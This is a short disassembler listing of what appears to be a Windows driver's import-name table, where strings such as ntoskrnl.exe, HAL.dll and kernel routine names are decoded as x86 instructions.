  40a71e:	65 79 00             	gs jns 0x40a721
  40a721:	00 52 01             	add    %dl,0x1(%edx)
  40a724:	49                   	dec    %ecx
  40a725:	6f                   	outsl  %ds:(%esi),(%dx)
  40a726:	44                   	inc    %esp
  40a727:	65 74 61             	gs je  0x40a78b
  40a72a:	63 68 44             	arpl   %ebp,0x44(%eax)
  40a72d:	65 76 69             	gs jbe 0x40a799
  40a730:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a733:	00 42 03             	add    %al,0x3(%edx)
  40a736:	50                   	push   %eax
  40a737:	6f                   	outsl  %ds:(%esi),(%dx)
  40a738:	53                   	push   %ebx
  40a739:	74 61                	je     0x40a79c
  40a73b:	72 74                	jb     0x40a7b1
  40a73d:	4e                   	dec    %esi
  40a73e:	65 78 74             	gs js  0x40a7b5
  40a741:	50                   	push   %eax
  40a742:	6f                   	outsl  %ds:(%esi),(%dx)
  40a743:	77 65                	ja     0x40a7aa
  40a745:	72 49                	jb     0x40a790
  40a747:	72 70                	jb     0x40a7b9
  40a749:	00 53 03             	add    %dl,0x3(%ebx)
  40a74c:	50                   	push   %eax
  40a74d:	73 47                	jae    0x40a796
  40a74f:	65 74 43             	gs je  0x40a795
  40a752:	75 72                	jne    0x40a7c6
  40a754:	72 65                	jb     0x40a7bb
  40a756:	6e                   	outsb  %ds:(%esi),(%dx)
  40a757:	74 50                	je     0x40a7a9
  40a759:	72 6f                	jb     0x40a7ca
  40a75b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a75e:	73 49                	jae    0x40a7a9
  40a760:	64 00 a1 02 4d 6d 47 	add    %ah,%fs:0x476d4d02(%ecx)
  40a767:	65 74 53             	gs je  0x40a7bd
  40a76a:	79 73                	jns    0x40a7df
  40a76c:	74 65                	je     0x40a7d3
  40a76e:	6d                   	insl   (%dx),%es:(%edi)
  40a76f:	52                   	push   %edx
  40a770:	6f                   	outsl  %ds:(%esi),(%dx)
  40a771:	75 74                	jne    0x40a7e7
  40a773:	69 6e 65 41 64 64 72 	imul   $0x72646441,0x65(%esi),%ebp
  40a77a:	65 73 73             	gs jae 0x40a7f0
  40a77d:	00 75 03             	add    %dh,0x3(%ebp)
  40a780:	50                   	push   %eax
  40a781:	73 47                	jae    0x40a7ca
  40a783:	65 74 56             	gs je  0x40a7dc
  40a786:	65 72 73             	gs jb  0x40a7fc
  40a789:	69 6f 6e 00 00 6e 74 	imul   $0x746e0000,0x6e(%edi),%ebp
  40a790:	6f                   	outsl  %ds:(%esi),(%dx)
  40a791:	73 6b                	jae    0x40a7fe
  40a793:	72 6e                	jb     0x40a803
  40a795:	6c                   	insb   (%dx),%es:(%edi)
  40a796:	2e 65 78 65          	cs js,pn 0x40a7ff
  40a79a:	00 00                	add    %al,(%eax)
  40a79c:	40                   	inc    %eax
  40a79d:	00 4b 65             	add    %cl,0x65(%ebx)
  40a7a0:	47                   	inc    %edi
  40a7a1:	65 74 43             	gs je  0x40a7e7
  40a7a4:	75 72                	jne    0x40a818
  40a7a6:	72 65                	jb     0x40a80d
  40a7a8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7a9:	74 49                	je     0x40a7f4
  40a7ab:	72 71                	jb     0x40a81e
  40a7ad:	6c                   	insb   (%dx),%es:(%edi)
  40a7ae:	00 00                	add    %al,(%eax)
  40a7b0:	48                   	dec    %eax
  40a7b1:	41                   	inc    %ecx
  40a7b2:	4c                   	dec    %esp
  40a7b3:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a7b6:	6c                   	insb   (%dx),%es:(%edi)
  40a7b7:	00 a9 05 6d 65 6d    	add    %ch,0x6d656d05(%ecx)
  40a7bd:	73 65                	jae    0x40a824
  40a7bf:	74 00                	je     0x40a7c1
  40a7c1:	00 85 05 5f 65 78    	add    %al,0x78655f05(%ebp)
  40a7c7:	63 65 70             	arpl   %esp,0x70(%ebp)
  40a7ca:	74 5f                	je     0x40a82b
  40a7cc:	68 61 6e 64 6c       	push   $0x6c646e61
  40a7d1:	65 72 33             	gs jb  0x40a807
  40a7d4:	00 00                	add    %al,(%eax)
  40a7d6:	7d 05                	jge    0x40a7dd
  40a7d8:	5f                   	pop    %edi
  40a7d9:	61                   	popa
  40a7da:	6c                   	insb   (%dx),%es:(%edi)
  40a7db:	6c                   	insb   (%dx),%es:(%edi)
  40a7dc:	72 65                	jb     0x40a843
  40a7de:	6d                   	insl   (%dx),%es:(%edi)
  40a7df:	00 79 05             	add    %bh,0x5(%ecx)
  40a7e2:	5f                   	pop    %edi
  40a7e3:	61                   	popa
  40a7e4:	6c                   	insb   (%dx),%es:(%edi)
  40a7e5:	6c                   	insb   (%dx),%es:(%edi)
  40a7e6:	64 69 76 00 a7 05 6d 	imul   $0x656d05a7,%fs:0x0(%esi),%esi
  40a7ed:	65 
  40a7ee:	6d                   	insl   (%dx),%es:(%edi)
  40a7ef:	63 70 79             	arpl   %esi,0x79(%eax)
	...
